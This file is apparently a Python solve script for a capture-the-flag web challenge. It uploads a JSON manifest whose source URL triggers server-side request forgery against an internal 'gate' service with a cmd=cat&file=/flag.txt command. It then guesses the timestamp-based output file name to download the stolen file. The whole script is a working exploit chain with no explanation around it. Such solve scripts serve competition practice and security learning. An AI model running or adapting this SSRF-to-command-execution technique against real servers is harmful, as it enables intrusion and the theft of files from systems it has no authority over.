import requests
import json
from datetime import datetime, timezone
import time

url = "http://ctf.noctralupra.space:10313"
upload = "/manifest_upload.php"
download = "/get.php"

ssrf = "http://gate:8081/run?cmd=cat&file=/flag.txt"
EXT = "txt"

def utc_minute_stamp(dt=None):
    if dt is None:
        dt = datetime.now(timezone.utc)
    return dt.strftime("%Y%m%d_%H%M")

def build_filename(utc_min, ext):
    return f"cg_{utc_min}.{ext}"

def upload_manifest():
    manifest = {"source": ssrf, "ext": EXT}
    manifest_str = json.dumps(manifest, separators=(",", ":"))

    t0 = datetime.now(timezone.utc)
    utc_min = utc_minute_stamp(t0)

    files = {"manifest": ("test.json", manifest_str, "application/json")}

    r = requests.post(
        url + upload,
        files=files,
        headers={
            "Origin": "null",
            "Upgrade-Insecure-Requests": "1",
        },
        timeout=10,
    )
    r.raise_for_status()
    return r.text, utc_min

def try_download(utc_min_guess, ext):
    name = build_filename(utc_min_guess, ext)
    params = {"name": name}

    r = requests.get(
        url + download,
        params=params,
        headers={"Upgrade-Insecure-Requests": "1"},
        timeout=10,
    )
    if r.status_code == 200 and r.content:
        return True, r.content, name
    return False, r.text, name

def main():
    txt, utc_min = upload_manifest()
    ok, body, fname = try_download(utc_min, EXT)
    print(f"download: {fname} : {'OK' if ok else 'FAIL'}")

    if not ok:
        next_min = utc_minute_stamp(datetime.now(timezone.utc))
        if next_min != utc_min:
            print("Minute rolled over; trying current minute.")
            ok, body, fname = try_download(next_min, EXT)
            print(f"download: {fname} : {'OK' if ok else 'FAIL'}")

    if not ok:
        time.sleep(1)
        cur_min = utc_minute_stamp(datetime.now(timezone.utc))
        ok, body, fname = try_download(cur_min, EXT)
        print(f"download: {fname} : {'OK' if ok else 'FAIL'}")

    if ok:
        try:
            print(body.decode(errors="replace"))
        except Exception:
            print(body)
    else:
        print("failed.")

if __name__ == "__main__":
    main()
